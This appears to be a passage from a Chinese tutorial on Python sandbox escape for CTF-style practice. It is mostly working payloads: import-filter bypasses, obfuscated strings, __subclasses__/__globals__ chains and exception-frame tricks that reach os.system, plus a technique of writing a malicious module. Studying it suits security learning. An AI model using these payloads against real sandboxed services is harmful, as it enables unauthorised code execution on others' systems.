&#x27;shelve&#x27;, &#x27;UpdateManager&#x27;, &#x27;ast&#x27;, &#x27;io&#x27;, &#x27;shlex&#x27;, &#x27;__future__&#x27;, &#x27;asynchat&#x27;, &#x27;ipaddress&#x27;, &#x27;shutil&#x27;, &#x27;_ast&#x27;, &#x27;asyncio&#x27;, &#x27;itertools&#x27;, &#x27;signal&#x27;, &#x27;_asyncio&#x27;, &#x27;asyncore&#x27;, &#x27;janitor&#x27;, &#x27;simplejson&#x27;, &#x27;_bisect&#x27;, &#x27;atexit&#x27;, &#x27;json&#x27;, &#x27;site&#x27;, &#x27;_blake2&#x27;, &#x27;audioop&#x27;, &#x27;keyring&#x27;, &#x27;sitecustomize&#x27;, &#x27;_bootlocale&#x27;, &#x27;base64&#x27;, &#x27;keyword&#x27;, &#x27;six&#x27;, &#x27;_bz2&#x27;, &#x27;bdb&#x27;, &#x27;language_support_pkgs&#x27;, &#x27;smtpd&#x27;, &#x27;_cffi_backend&#x27;, &#x27;binascii&#x27;, &#x27;launchpadlib&#x27;, &#x27;smtplib&#x27;, &#x27;_codecs&#x27;, &#x27;binhex&#x27;, &#x27;linecache&#x27;, &#x27;sndhdr&#x27;, &#x27;_codecs_cn&#x27;, &#x27;bisect&#x27;, &#x27;locale&#x27;, &#x27;socket&#x27;, &#x27;_codecs_hk&#x27;, &#x27;brlapi&#x27;, &#x27;logging&#x27;, &#x27;socketserver&#x27;, &#x27;_codecs_iso2022&#x27;, &#x27;builtins&#x27;, &#x27;louis&#x27;, &#x27;softwareproperties&#x27;, &#x27;_codecs_jp&#x27;, &#x27;bz2&#x27;, &#x27;lsb_release&#x27;, &#x27;speechd&#x27;, &#x27;_codecs_kr&#x27;, &#x27;cProfile&#x27;, &#x27;lzma&#x27;, &#x27;speechd_config&#x27;, &#x27;_codecs_tw&#x27;, &#x27;cairo&#x27;, &#x27;macaroonbakery&#x27;, &#x27;spwd&#x27;, &#x27;_collections&#x27;, &#x27;calendar&#x27;, &#x27;macpath&#x27;, &#x27;sqlite3&#x27;, &#x27;_collections_abc&#x27;, &#x27;certifi&#x27;, &#x27;macurl2path&#x27;, &#x27;sre_compile&#x27;, &#x27;_compat_pickle&#x27;, &#x27;cgi&#x27;, &#x27;mailbox&#x27;, &#x27;sre_constants&#x27;, &#x27;_compression&#x27;, &#x27;cgitb&#x27;, &#x27;mailcap&#x27;, &#x27;sre_parse&#x27;, &#x27;_crypt&#x27;, &#x27;chardet&#x27;, &#x27;mako&#x27;, &#x27;ssl&#x27;, &#x27;_csv&#x27;, &#x27;chunk&#x27;, &#x27;markupsafe&#x27;, &#x27;stat&#x27;, &#x27;_ctypes&#x27;, &#x27;cmath&#x27;, &#x27;marshal&#x27;, &#x27;statistics&#x27;, &#x27;_ctypes_test&#x27;, &#x27;cmd&#x27;, &#x27;math&#x27;, &#x27;string&#x27;, &#x27;_curses&#x27;, &#x27;code&#x27;, &#x27;mimetypes&#x27;, &#x27;stringprep&#x27;, &#x27;_curses_panel&#x27;, &#x27;codecs&#x27;, &#x27;mmap&#x27;, &#x27;struct&#x27;, &#x27;_datetime&#x27;, &#x27;codeop&#x27;, &#x27;modual_test&#x27;, &#x27;subprocess&#x27;, &#x27;_dbm&#x27;, &#x27;collections&#x27;, &#x27;modulefinder&#x27;, &#x27;sunau&#x27;, &#x27;_dbus_bindings&#x27;, &#x27;colorsys&#x27;, &#x27;multiprocessing&#x27;, &#x27;symbol&#x27;, &#x27;_dbus_glib_bindings&#x27;, &#x27;compileall&#x27;, &#x27;nacl&#x27;, &#x27;symtable&#x27;, &#x27;_decimal&#x27;, &#x27;concurrent&#x27;, &#x27;netrc&#x27;, &#x27;sys&#x27;, &#x27;_dummy_thread&#x27;, &#x27;configparser&#x27;, &#x27;nis&#x27;, &#x27;sysconfig&#x27;, &#x27;_elementtree&#x27;, &#x27;contextlib&#x27;, &#x27;nntplib&#x27;, &#x27;syslog&#x27;, &#x27;_functools&#x27;, &#x27;copy&#x27;, &#x27;ntpath&#x27;, &#x27;systemd&#x27;, &#x27;_gdbm&#x27;, &#x27;copyreg&#x27;, &#x27;nturl2path&#x27;, &#x27;tabnanny&#x27;, &#x27;_hashlib&#x27;, &#x27;crypt&#x27;, &#x27;numbers&#x27;, &#x27;tarfile&#x27;, &#x27;_heapq&#x27;, &#x27;cryptography&#x27;, &#x27;oauth&#x27;, &#x27;telnetlib&#x27;, &#x27;_imp&#x27;, &#x27;csv&#x27;, &#x27;olefile&#x27;, &#x27;tempfile&#x27;, &#x27;_io&#x27;, &#x27;ctypes&#x27;, &#x27;opcode&#x27;, &#x27;termios&#x27;, &#x27;_json&#x27;, &#x27;cups&#x27;, &#x27;operator&#x27;, &#x27;test&#x27;, &#x27;_locale&#x27;, &#x27;cupsext&#x27;, &#x27;optparse&#x27;, &#x27;textwrap&#x27;, &#x27;_lsprof&#x27;, &#x27;cupshelpers&#x27;, &#x27;orca&#x27;, &#x27;_lzma&#x27;, &#x27;curses&#x27;, &#x27;os&#x27;, &#x27;threading&#x27;, &#x27;_markupbase&#x27;, &#x27;datetime&#x27;, &#x27;ossaudiodev&#x27;, &#x27;time&#x27;, &#x27;_md5&#x27;, &#x27;dbm&#x27;, &#x27;parser&#x27;, &#x27;timeit&#x27;, &#x27;_multibytecodec&#x27;, &#x27;dbus&#x27;, &#x27;pathlib&#x27;, &#x27;token&#x27;, &#x27;_multiprocessing&#x27;, &#x27;deb822&#x27;, &#x27;pcardext&#x27;, &#x27;tokenize&#x27;, &#x27;_opcode&#x27;, &#x27;debconf&#x27;, &#x27;pdb&#x27;, &#x27;trace&#x27;, &#x27;_operator&#x27;, &#x27;debian&#x27;, &#x27;pexpect&#x27;, &#x27;traceback&#x27;, &#x27;_osx_support&#x27;, &#x27;debian_bundle&#x27;, &#x27;pickle&#x27;, &#x27;tracemalloc&#x27;, &#x27;_pickle&#x27;, &#x27;decimal&#x27;, &#x27;pickletools&#x27;, &#x27;tty&#x27;, &#x27;_posixsubprocess&#x27;, &#x27;defer&#x27;, &#x27;pipes&#x27;, &#x27;turtle&#x27;, &#x27;_pydecimal&#x27;, &#x27;difflib&#x27;, &#x27;pkg_resources&#x27;, &#x27;types&#x27;, &#x27;_pyio&#x27;, &#x27;dis&#x27;, &#x27;pkgutil&#x27;, &#x27;typing&#x27;, &#x27;_random&#x27;, &#x27;distro_info&#x27;, &#x27;platform&#x27;, &#x27;ufw&#x27;, &#x27;_sha1&#x27;, &#x27;distro_info_test&#x27;, &#x27;plistlib&#x27;, &#x27;unicodedata&#x27;, &#x27;_sha256&#x27;, &#x27;distutils&#x27;, &#x27;poplib&#x27;, &#x27;unittest&#x27;, &#x27;_sha3&#x27;, &#x27;doctest&#x27;, &#x27;posix&#x27;, &#x27;urllib&#x27;, &#x27;_sha512&#x27;, &#x27;dummy_threading&#x27;, &#x27;posixpath&#x27;, &#x27;urllib3&#x27;, &#x27;_signal&#x27;, &#x27;email&#x27;, &#x27;pprint&#x27;, &#x27;usbcreator&#x27;, &#x27;_sitebuiltins&#x27;, &#x27;encodings&#x27;, &#x27;problem_report&#x27;, &#x27;uu&#x27;, &#x27;_socket&#x27;, &#x27;enum&#x27;, &#x27;profile&#x27;, &#x27;uuid&#x27;, &#x27;_sqlite3&#x27;, &#x27;errno&#x27;, &#x27;pstats&#x27;, &#x27;venv&#x27;, &#x27;_sre&#x27;, &#x27;faulthandler&#x27;, &#x27;pty&#x27;, &#x27;wadllib&#x27;, &#x27;_ssl&#x27;, &#x27;fcntl&#x27;, &#x27;ptyprocess&#x27;, &#x27;warnings&#x27;, &#x27;_stat&#x27;, &#x27;filecmp&#x27;, &#x27;pwd&#x27;, &#x27;wave&#x27;, &#x27;_string&#x27;, &#x27;fileinput&#x27;, &#x27;py_compile&#x27;, &#x27;weakref&#x27;, &#x27;_strptime&#x27;, &#x27;fnmatch&#x27;, &#x27;pyatspi&#x27;, &#x27;webbrowser&#x27;, &#x27;_struct&#x27;, &#x27;formatter&#x27;, &#x27;pyclbr&#x27;, &#x27;wsgiref&#x27;, &#x27;_symtable&#x27;, &#x27;fractions&#x27;, &#x27;pydoc&#x27;, &#x27;xdg&#x27;, &#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;, &#x27;ftplib&#x27;, &#x27;pydoc_data&#x27;, &#x27;xdrlib&#x27;, &#x27;_testbuffer&#x27;, &#x27;functools&#x27;, &#x27;pyexpat&#x27;, &#x27;xkit&#x27;, &#x27;_testcapi&#x27;, &#x27;gc&#x27;, &#x27;pygtkcompat&#x27;, &#x27;xml&#x27;, &#x27;_testimportmultiple&#x27;, &#x27;genericpath&#x27;, &#x27;pymacaroons&#x27;, &#x27;xmlrpc&#x27;, &#x27;_testmultiphase&#x27;, &#x27;getopt&#x27;, &#x27;pyrfc3339&#x27;, &#x27;xxlimited&#x27;, &#x27;_thread&#x27;, &#x27;getpass&#x27;, &#x27;pytz&#x27;, &#x27;xxsubtype&#x27;, &#x27;_threading_local&#x27;, &#x27;gettext&#x27;, &#x27;queue&#x27;, &#x27;yaml&#x27;, &#x27;_tracemalloc&#x27;, &#x27;gi&#x27;, &#x27;quopri&#x27;, &#x27;zipapp&#x27;, &#x27;_warnings&#x27;, &#x27;glob&#x27;, &#x27;random&#x27;, &#x27;zipfile&#x27;, &#x27;_weakref&#x27;, &#x27;grp&#x27;, &#x27;re&#x27;, &#x27;zipimport&#x27;, &#x27;_weakrefset&#x27;, &#x27;gtweak&#x27;, &#x27;readline&#x27;, &#x27;zlib&#x27;, &#x27;_yaml&#x27;, &#x27;gzip&#x27;, &#x27;reportlab&#x27;, &#x27;zope&#x27;, &#x27;abc&#x27;, &#x27;hashlib&#x27;, &#x27;reprlib&#x27;, &#x27;aifc&#x27;, &#x27;heapq&#x27;]methods = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;]results = &#123;&#125;				#空字典 results，用于存储每个模块的检查结果for module in all_modules_3:    results[module] = &#123;        &#x27;flag&#x27;: 0,        &#x27;result&#x27;: &#123;&#125;    &#125;    try:        m = __import__(module)        attrs = dir(m)			#获取对象 m 的所有属性和方法的名称列表        for method in methods:            if method in attrs:                result = &#x27;yes&#x27;                results[module][&#x27;flag&#x27;] = 1            else:                result = &#x27;no&#x27;            results[module][&#x27;result&#x27;][method] = result    except Exception as e:        print(e)for result in results:    if results[result][&#x27;flag&#x27;]:        print(&#x27;[+]&#x27; + result)        for r in results[result][&#x27;result&#x27;]:            print(&#x27;  [-]&#x27; + r + &#x27;: &#x27; + results[result][&#x27;result&#x27;][r])

all_modules_2就是 2.x 的标准库，all_modules_3 就是 3.x 的标准库
花式使用import首先，禁用 import os 肯定是不行的，因为
import  osimport   osimport    os...

都可以。如果多个空格也过滤了，Python 能够 import 的可不止 import，还有 __import__：__import__(&#39;os&#39;)，__import__被干了还有 importlib：importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)
这样就安全了吗？实际上import可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 execfile 来代替：
execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)system(&#x27;ls&#x27;)

不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：
with open(&#x27;/usr/lib/python3.6/os.py&#x27;,&#x27;r&#x27;) as f:    exec(f.read())system(&#x27;ls&#x27;)

这个方法倒是 2.x、3.x 通用的
不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：
import sysprint(sys.path)

eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等
[&#x27;__builtins__&#x27;] == [&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;] == [u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;] == [&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)] == [&#x27;__buil&#x27;+&#x27;tins__&#x27;] == [&#x27;__buil&#x27;&#x27;tins__&#x27;] == [&#x27;__buil&#x27;.__add__(&#x27;tins__&#x27;)] == [&quot;_builtins_&quot;.join(&quot;__&quot;)] == [&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27; % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]...

最后那个格式化字符串，任意字符都可以构造出来
恢复 sys.modulessys.modules 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 os 是默认被加载进来的，但是不能直接使用（但是可以通过 sys.modules 来使用，例如 sys.modules[&quot;os&quot;]），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。
如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：
&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(&#x27;ls&#x27;)Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;&gt;&gt;&gt;

注意，这里不能用 del sys.modules[&#39;os&#39;]，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。
所以删了 sys.modules[&#39;os&#39;] 只会让 Python 重新加载一次 os。
看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：
sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;del sys.modules[&#x27;os&#x27;]import osos.system(&#x27;ls&#x27;)

花式执行函数通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过os.system执行系统命令，并且这里的system也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在/usr/lib/python2.7/os.py中删了system函数。。。
不过，要明确的是，os 中能够执行系统命令的函数有很多：
print(os.system(&#x27;whoami&#x27;))print(os.popen(&#x27;whoami&#x27;).read()) print(os.popen2(&#x27;whoami&#x27;).read()) # 2.xprint(os.popen3(&#x27;whoami&#x27;).read()) # 2.xprint(os.popen4(&#x27;whoami&#x27;).read()) # 2.x...

过滤system的时候说不定还有其他函数给漏了
其次，可以通过 getattr 拿到对象的方法、属性：
import osgetattr(os, &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)

不让出现 import 也没事：
&gt;&gt;&gt; getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)macr0phag30

一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱

getattr 是 Python 中的一个内置函数，用于获取对象的属性值。它的语法如下：
getattr(object, name[, default])


object：表示要获取属性的对象。
name：表示要获取的属性的名称。
default：可选参数，表示当属性不存在时返回的默认值。如果省略了 default 参数，并且属性不存在，那么 getattr 将会引发 AttributeError 异常。

getattr 的作用是从对象中获取指定名称的属性值。如果对象中存在该属性，则返回该属性的值；如果不存在，则根据情况返回默认值或引发异常
与 getattr 相似的还有 __getattr__、__getattribute__，它们自己的区别就是getattr相当于class.attr，都是获取类属性&#x2F;方法的一种方式，在获取的时候会触发__getattribute__，如果__getattribute__找不到，则触发__getattr__，还找不到则报错
builtins、builtin__与__builtins先说一下，builtin、builtins，__builtin__与__builtins__的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如chr、open。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 LEGB 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。
在 2.x 版本中，内建模块被命名为 __builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看：2.x：
&gt;&gt;&gt; import __builtin__&gt;&gt;&gt; __builtin__&lt;module &#x27;__builtin__&#x27; (built-in)&gt;

3.x：
&gt;&gt;&gt; import builtins&gt;&gt;&gt; builtins&lt;module &#x27;builtins&#x27; (built-in)&gt;

但是，__builtins__ 两者都有，实际上是__builtin__和builtins 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过__builtins__与__builtin__和builtins是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，__builtins__ 相对实用一点，并且在 __builtins__里有很多好东西：
&gt;&gt;&gt; &#x27;__import__&#x27; in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; &#x27;eval&#x27; in dir(__builtins__)True&gt;&gt;&gt; &#x27;execfile&#x27; in dir(__builtins__)True

（不知为何我在pycharm自带的控制台里面运行就不行，但是自己写脚本的话就可以）
这里稍微解释下 x.__dict__ ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：

内置的数据类型没有 __dict__ 属性
每个类有自己的 __dict__ 属性，就算存着继承关系，父类的 __dict__ 并不会影响子类的 __dict__
对象也有自己的 __dict__ 属性，包含 self.xxx 这种实例属性

那么既然__builtins__有这么多危险的函数，不如将里面的危险函数破坏了：
__builtins__.__dict__[&#x27;eval&#x27;] = &#x27;not allowed&#x27;

或者直接删了：
del __builtins__.__dict__[&#x27;eval&#x27;]

但是我们可以利用 reload(__builtins__) 来恢复 __builtins__。不过，我们在使用 reload 的时候也没导入，说明 reload也在 __builtins__里，那如果连reload都从__builtins__中删了，就没法恢复__builtins__了，需要另寻他法。还有一种情况是利用 exec command in _global 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。
这里注意，2.x 的 reload 是内建的，3.x 需要 import imp，然后再 imp.reload。你看，reload 的参数是 module，所以肯定还能用于重新载入其他模块
通过继承关系逃逸在 Python 中提到继承就不得不提 mro，mro就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。.__mro__ 或 .mro()，是个元组，记录了继承关系：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)

类的实例在获取 __class__ 属性时会指向该实例对应的类。可以看到，&#39;&#39;属于 str类，它继承了 object 类，这个类是所有类的超类。具有相同功能的还有__base__和__bases__。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：
&gt;&gt;&gt; class test:...     pass...&gt;&gt;&gt; test.__bases__()&gt;&gt;&gt; class test(object):...     pass...&gt;&gt;&gt; test.__bases__(&lt;type &#x27;object&#x27;&gt;,)

那么知道这个有什么用呢？
由于没法直接引入 os，那么假如有个库叫oos，在oos中引入了os，那么我们就可以通过__globals__拿到 os。例如，site 这个库就有 os：
&gt;&gt;&gt; import site&gt;&gt;&gt; site.os&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py&#x27;&gt;

怎么理解这个 __globals__ 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 builtin_function_or_method 或者是 wrapper_descriptor 、method-wrapper 类型的函数，例如 range、range.__init__、&#39;&#39;.split 等等。
那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 import site。可以利用 reload，变相加载 os：
&gt;&gt;&gt; import site&gt;&gt;&gt; osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &#x27;os&#x27; is not defined&gt;&gt;&gt; os = reload(site.os)&gt;&gt;&gt; os.system(&#x27;whoami&#x27;)macr0phag30

还有，既然所有的类都继承的object，那么我们先用__subclasses__看看它的子类（我的另一篇博客ssti学习中有相关知识）
以 2.x 的site._Printer为例（py3.x 中已经移除了这里 __globals__ 的 os）：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[&#x27;os&#x27;]&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;&gt;&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i._Printer__setup.__globals__[&#x27;os&#x27;] for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_Printer&quot;]&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;&gt;

os 又回来了。并且 site 中还有 __builtins__。
这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 warnings：
&gt;&gt;&gt; import warnings&gt;&gt;&gt; &gt;&gt;&gt; warnings.osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;module&#x27; object has no attribute &#x27;os&#x27;&gt;&gt;&gt; &gt;&gt;&gt; warnings.linecache&lt;module &#x27;linecache&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module &#x27;os&#x27; from &#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;&gt;

在继承链中就可以这样（py3.x 中已经移除了这里 __globals__ 的 linecache）：
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i.__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;) for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;catch_warnings&quot;]

顺便说一下，warnings这个库中有个函数：warnings.catch_warnings，它有个_module属性：
    def __init__(self, record=False, module=None):...        self._module = sys.modules[&#x27;warnings&#x27;] if module is None else module...

所以通过_module也可以构造 payload（py3.x 中已经移除了 catch_warnings 的 linecache）：
&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)macr0phag30

3.x 中的warnings虽然没有 linecache，也有__builtins__
同样，py3.x 中有&lt;class &#39;os._wrap_close&#39;&gt;，利用方式可以为：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_wrap_close&quot;][0].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)

当然这样也是可以的（3.x）：
set.mro()[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)

顺便提一下，object 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：
object.__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)

还有一种是利用builtin_function_or_method 的 __call__：
&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#x27;1+1&#x27;)

或者简单一点：
[].pop.__class__.__call__(eval, &#x27;1+1&#x27;)

上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 __name__ 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。
最后再补充几个。
可以这样利用：
class test(dict):    def __init__(self):        print(super(test, self).keys.__class__.__call__(eval, &#x27;1+1&#x27;))        # 如果是 3.x 的话可以简写为：        # super().keys.__class__.__call__(eval, &#x27;1+1&#x27;))test()

还可以利用异常逃逸：
hack = lambda : [0][1]try:    hack()except Exception as e:    e.__traceback__.tb_next.tb_frame.f_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)

还可以利用 format：

&quot;&#123;0.__class__.__base__&#125;&quot;.format([])
&quot;&#123;x.__class__.__base__&#125;&quot;.format(x=[])
&quot;&#123;.__class__.__base__&#125;&quot;.format([])
(&quot;&#123;0.__class_&quot;+&quot;_.__base__&#125;&quot;).format([])

（这里顺手记录下，对于字典键是整数型的比如 &#123;&quot;1&quot;:2&#125;，format 是无法拿到值的 :)，这样会报错：&#39;&#39;&#39; &#123;0[&#39;1&#39;]&#125; &#39;&#39;&#39;.format(&#123;&quot;1&quot;:2&#125;)，&#39;1&#39; 引号去掉的话又会报没有这个键，这个特性可以见文档）
上面的这些利用方式总结起来就是通过 .mro()、__class__、type(...)、__mro__、__subclasses__、__base__、__bases__ 等属性&#x2F;方法去获取 object，再根据__globals__找引入的__builtins__或者eval等等能够直接被利用的库，或者找到builtin_function_or_method类&#x2F;类型__call__后直接运行eval
文件读写2.x 有个内建的 file：
&gt;&gt;&gt; file(&#x27;key&#x27;).read()&#x27;Macr0phag3\n&#x27;&gt;&gt;&gt; file(&#x27;key&#x27;, &#x27;w&#x27;).write(&#x27;Macr0phag3&#x27;)&gt;&gt;&gt; file(&#x27;key&#x27;).read()&#x27;Macr0phag3&#x27;

还有个 open，2.x 与 3.x 通用。
还有一些库，例如：types.FileType(rw)、platform.popen(rw)、linecache.getlines(r)。
为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为math.py，然后 import 进来：math.py：
import osprint(os.system(&#x27;whoami&#x27;))

调用
&gt;&gt;&gt; import mathmacr0phag30

这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在sys.modules中有的，这些库无法这样利用，会直接从sys.modules中加入，比如re：
&gt;&gt;&gt; &#x27;re&#x27; in sys.modulesTrue&gt;&gt;&gt; &#x27;math&#x27; in sys.modulesFalse

当然在import re 之前del sys.modules[&#39;re&#39;]也不是不可以…
最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 test的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。
读文件暂时没什么发现特别的地方。
剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：
&gt;&gt;&gt; __builtins__.open(&#x27;key&#x27;).read()&#x27;Macr0phag3\n&#x27;

或者
&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40](&#x27;key&#x27;).read()&#x27;Macr0phag3&#x27;

敏感信息泄露这个也算只能读吧。

dir()

__import__(&quot;__main__&quot;).x，其中 __main__ 还会泄露脚本的绝对路径：&lt;module &#39;__main__&#39; from &#39;xxx.py&#39;&gt;

__file__，文件绝对路径

x.__dict__

locals()

globals()

vars()

sys._getframe(0).f_code.co_varnames：
用于获取当前执行代码块的局部变量名称列表：

sys._getframe(0): 这是一个调用 sys 模块中的 _getframe() 函数的示例。_getframe() 函数用于访问调用栈的帧对象，参数 0 表示获取当前帧（即调用该语句的帧）。
.f_code: 这是帧对象的一个属性，代表正在执行的代码的代码对象。
.co_varnames: 这是代码对象的一个属性，包含了当前代码块的局部变量名称列表


sys._getframe(0).f_locals：
用于获取当前执行代码块的局部变量字典：

sys._getframe(0): 这是一个调用 sys 模块中的 _getframe() 函数的示例。_getframe() 函数用于访问调用栈的帧对象，参数 0 表示获取当前帧（即调用该语句的帧）。
.f_locals: 这是帧对象的一个属性，包含了当前执行代码块的局部变量字典


inspect.x，inspect 有很多方法可以获取信息，比如获取源码可以用 inspect.getsource，还有其他很多的功能

…


绕过姿势过滤 [ ]应对的方式就是将[]的功能用pop、__getitem__ 代替（实际上a[0]就是在内部调用了a.__getitem__(0)）：
&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read()&#x27;macr0phag3\n&#x27;

当然，dict 也是可以 pop 的：&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)
当然也可以用 next(iter()) 替代，或许可以加上 max 之类的玩意。
过滤引号
chr

最简单就是用 chr 啦
os.system(    chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))


扣字符

利用 str 和 []，挨个把字符拼接出来
os.system(    str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3])

当然 [] 如果被过滤了也可以 bypass，前面说过了。
如果 str 被过滤了怎么办呢？type(&#39;&#39;)()、format() 即可。同理，int、list 都可以用 type 构造出来。

格式化字符串

那过滤了引号，格式化字符串还能用吗？
(chr(37)+str(&#123;&#125;.__class__)[1])%100 == &#x27;d&#x27;

又起飞了…

dict() 拿键它不香吗？

&#x27;whoami&#x27; ==list(dict(whoami=1))[0] ==str(dict(whoami=1))[2:8] ==

限制数字上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：

0：int(bool([]))、Flase、len([])、any(())
1：int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop())
获取稍微大的数字：len(str(&#123;&#125;.keys))，不过需要慢慢找长度符合的字符串
1.0：float(True)
-1：~0
…

其实有了 0 就可以了，要啥整数直接做运算即可：
0 ** 0 == 11 + 1 == 22 + 1 == 32 ** 2 == 4...

限制空格空格通常来说可以通过 ()、[] 替换掉。例如：
